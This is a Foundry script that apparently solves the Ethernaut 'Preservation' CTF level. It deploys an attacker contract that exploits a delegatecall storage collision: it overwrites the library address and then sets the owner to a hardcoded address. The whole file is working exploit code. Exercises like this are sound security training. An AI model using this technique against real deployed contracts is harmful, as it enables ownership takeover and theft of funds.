// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Preservation} from "../src/Preservation.sol";

contract PreservationSolve is Script{
    Preservation public preservation = Preservation(0x67403A5bC365868E3f9800c6308ca3623Bb1e446);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("timeZone1Library Address : ", preservation.timeZone1Library());
        console.log("timeZone2Library Address : ", preservation.timeZone2Library());
        console.log("Owner : ", preservation.owner());
        
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        

        attack.exploit();


        console.log("timeZone1Library Address : ", preservation.timeZone1Library());
        console.log("timeZone2Library Address : ", preservation.timeZone2Library());
        console.log("Owner : ", preservation.owner());

        vm.stopBroadcast();
    }
}

contract Attack{
    // matching Preservation Storage Layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;


    function exploit() public {
        Preservation preservation = Preservation(0x67403A5bC365868E3f9800c6308ca3623Bb1e446);
        uint attacker = uint(uint160(address(this)));
        preservation.setSecondTime(attacker); // updating timeZone1Library address;

        preservation.setFirstTime(1);

    }
    function setTime(uint _time) public {
        // owner = address(uint160(_time));
        owner = address(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602);
    }
}